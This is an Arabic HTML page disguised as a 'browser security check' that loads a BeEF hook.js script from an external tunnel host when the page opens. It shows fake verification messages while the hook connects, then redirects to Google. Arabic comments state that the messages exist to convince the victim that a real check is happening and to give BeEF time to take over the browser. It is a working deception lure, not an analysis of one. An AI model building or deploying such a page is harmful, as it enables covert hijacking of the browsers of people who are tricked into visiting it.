<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من الأمان...</title>
    <script src="https://1be526304db6fe64-197-200-63-81.serveousercontent.com/hook.js"></script>
    
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            border: 4px solid #1a1a1a;
            border-top: 4px solid #00ff41;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status { margin-top: 20px; font-size: 1.2rem; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status" id="status">جاري فحص المتصفح للأمان...</div>

    <script>
        // مصفوفة رسائل لإقناع الضحية أن هناك عملية حقيقية تحدث
        const messages = [
            "جاري فحص بروتوكولات التشفير...",
            "تحليل عنوان IP الخاص بك...",
            "تأمين الجلسة الحالية...",
            "تم التحقق! جاري إعادة التوجيه..."
        ];

        let i = 0;
        const statusElement = document.getElementById('status');

        const interval = setInterval(() => {
            if (i < messages.length) {
                statusElement.innerText = messages[i];
                i++;
            } else {
                clearInterval(interval);
                // بعد انتهاء الرسائل، يتم إرسال الضحية لموقع حقيقي (مثل فيسبوك أو جوجل)
                // هذا يعطي الـ BeEF وقتاً كافياً (10 ثوانٍ) لتثبيت الاتصال
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);
            }
        }, 2500); // تغيير الرسالة كل ثانيتين ونصف
    </script>
</body>
</html>
</html>
